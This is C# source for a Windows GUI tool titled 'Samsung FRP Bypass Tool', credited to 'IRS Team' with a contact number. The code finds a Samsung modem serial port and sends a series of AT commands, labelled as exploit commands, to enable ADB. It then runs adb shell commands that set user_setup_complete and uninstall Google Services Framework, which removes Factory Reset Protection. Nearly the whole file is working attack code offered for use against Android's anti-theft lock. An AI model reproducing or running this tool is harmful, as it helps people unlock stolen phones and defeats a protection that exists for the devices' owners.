using System;
using System.Drawing;
using System.IO.Ports;
using System.Management; 
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;

namespace SamsungFRPTool
{
    // --- ENTRY POINT ---
    static class Program
    {
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new MainForm());
        }
    }

    // --- MAIN FORM ---
    public class MainForm : Form
    {
        private Button btnEnableAdb;
        private RichTextBox txtLog;
        private Label lblTitle;
        private Label lblCredits;
        private Label lblContact;
        private ProgressBar progressBar;
        private Label lblStatus;

        public MainForm()
        {
            // UI Setup
            this.Text = "Samsung FRP Tool - Android 16 (IRS Team)";
            this.Size = new Size(500, 520);
            this.FormBorderStyle = FormBorderStyle.FixedSingle;
            this.MaximizeBox = false;
            this.StartPosition = FormStartPosition.CenterScreen;
            this.BackColor = Color.FromArgb(32, 32, 32);

            lblTitle = new Label { Text = "Samsung FRP Bypass Tool", Font = new Font("Segoe UI", 16, FontStyle.Bold), ForeColor = Color.White, AutoSize = true, Location = new Point(20, 20) };
            this.Controls.Add(lblTitle);

            lblCredits = new Label { Text = "Supports Android 15 & 16 | Dev: IRS Team", Font = new Font("Segoe UI", 10, FontStyle.Regular), ForeColor = Color.Cyan, AutoSize = true, Location = new Point(24, 60) };
            this.Controls.Add(lblCredits);

            lblContact = new Label { Text = "Contact: +15129532720", Font = new Font("Segoe UI", 9, FontStyle.Italic), ForeColor = Color.LightGray, AutoSize = true, Location = new Point(24, 80) };
            this.Controls.Add(lblContact);

            txtLog = new RichTextBox { Location = new Point(20, 120), Size = new Size(445, 250), BackColor = Color.Black, ForeColor = Color.LimeGreen, Font = new Font("Consolas", 9), ReadOnly = true, BorderStyle = BorderStyle.None, Text = "--- Tool Ready ---\n" };
            this.Controls.Add(txtLog);

            progressBar = new ProgressBar { Location = new Point(20, 385), Size = new Size(445, 10), Style = ProgressBarStyle.Marquee, Visible = false };
            this.Controls.Add(progressBar);

            btnEnableAdb = new Button { Text = "ENABLE ADB && UNLOCK", Font = new Font("Segoe UI", 12, FontStyle.Bold), BackColor = Color.FromArgb(0, 120, 215), ForeColor = Color.White, FlatStyle = FlatStyle.Flat, Location = new Point(20, 410), Size = new Size(445, 50), Cursor = Cursors.Hand };
            btnEnableAdb.FlatAppearance.BorderSize = 0;
            btnEnableAdb.Click += BtnEnableAdb_Click;
            this.Controls.Add(btnEnableAdb);

            lblStatus = new Label { Text = "Make sure drivers are installed and phone is in *#0*#", ForeColor = Color.Gray, Location = new Point(20, 470), AutoSize = true };
            this.Controls.Add(lblStatus);
        }

        private async void BtnEnableAdb_Click(object sender, EventArgs e)
        {
            if (btnEnableAdb.Text.Contains("Running")) return;

            btnEnableAdb.Enabled = false;
            btnEnableAdb.Text = "Running Exploit...";
            btnEnableAdb.BackColor = Color.DimGray;
            progressBar.Visible = true;
            txtLog.Clear();
            Log("Initializing IRS Team Tool...");

            bool exploitSuccess = await Task.Run(() => RunSamsungExploit());

            if (exploitSuccess)
            {
                Log("\n[SUCCESS] Exploit Packet Sent!");
                Log("[IMPORTANT] Check phone screen NOW.");
                Log("Click 'Allow' on the USB Debugging popup.");
                Log("Waiting 10 seconds for user authorization...");
                
                await Task.Delay(10000); // Wait for user action

                await Task.Run(() => RemoveFRP_ViaADB());
            }

            progressBar.Visible = false;
            btnEnableAdb.Enabled = true;
            btnEnableAdb.Text = "ENABLE ADB && UNLOCK";
            btnEnableAdb.BackColor = Color.FromArgb(0, 120, 215);
            Log("\n[DONE] Operation Finished.");
        }

        private bool RunSamsungExploit()
        {
            Log("[*] Scanning for Samsung Modem...");
            string portName = FindSamsungModemPort();

            if (string.IsNullOrEmpty(portName))
            {
                Log("[!] ERROR: Samsung Modem Port not found.");
                Log("    Check Drivers & *#0*# Mode.");
                return false;
            }

            Log($"[*] Found Target: {portName}");
            
            // Exploit Commands
            string[] commands = new string[] { "AT\r\n", "AT+KSTRINGB=0,3\r\n", "AT+DUMPCTRL=1,0\r\n", "AT+DEBUGLVL=0,4\r\n", "AT+SWATD=0\r\n", "AT+ACTIVATE=0,0,0\r\n", "AT+SWATD=1\r\n" };

            try
            {
                using (SerialPort serial = new SerialPort(portName, 115200))
                {
                    serial.DtrEnable = true; serial.RtsEnable = true;
                    serial.ReadTimeout = 500; serial.WriteTimeout = 500;
                    serial.Open();
                    serial.Write("AT\r\n");
                    Thread.Sleep(200);
                    
                    foreach (string cmd in commands)
                    {
                        serial.Write(cmd);
                        Thread.Sleep(300);
                    }
                }
                return true;
            }
            catch (Exception ex)
            {
                Log($"[!] Connection Error: {ex.Message}");
                return false;
            }
        }

        private string FindSamsungModemPort()
        {
            try
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_PnPEntity WHERE Caption LIKE '%Samsung%' AND Caption LIKE '%Modem%'");
                foreach (ManagementObject item in searcher.Get())
                {
                    string name = item["Caption"].ToString();
                    if (name.Contains("(COM"))
                    {
                        int start = name.LastIndexOf("(COM") + 1;
                        int end = name.LastIndexOf(")");
                        return name.Substring(start, end - start);
                    }
                }
            }
            catch { Log("[!] WMI Error."); }
            return null;
        }

        private void RemoveFRP_ViaADB()
        {
            Log("[*] Checking ADB Status...");
            string devices = RunAdb("devices");
            if (!devices.Contains("\tdevice"))
            {
                Log("[!] Device not authorized.");
                return;
            }

            Log("[*] Removing FRP Lock...");
            RunAdb("shell content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:s:1");
            RunAdb("shell pm uninstall -k --user 0 com.google.android.gsf");
            RunAdb("shell am start -n com.android.settings/com.android.settings.Settings");
            Log("[SUCCESS] FRP Removed! Reset device now.");
            MessageBox.Show("FRP Removed! Please factory reset the device from settings.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private string RunAdb(string args)
        {
            if (!File.Exists("adb.exe")) { Log("[!] adb.exe missing!"); return ""; }
            try {
                Process p = new Process();
                p.StartInfo.FileName = "adb.exe"; p.StartInfo.Arguments = args;
                p.StartInfo.RedirectStandardOutput = true; p.StartInfo.UseShellExecute = false; p.StartInfo.CreateNoWindow = true;
                p.Start();
                string outStr = p.StandardOutput.ReadToEnd();
                p.WaitForExit();
                return outStr;
            } catch { return ""; }
        }

        private void Log(string msg)
        {
            if (InvokeRequired) { Invoke(new Action<string>(Log), msg); return; }
            txtLog.AppendText(msg + Environment.NewLine);
            txtLog.ScrollToCaret();
        }
    }
}
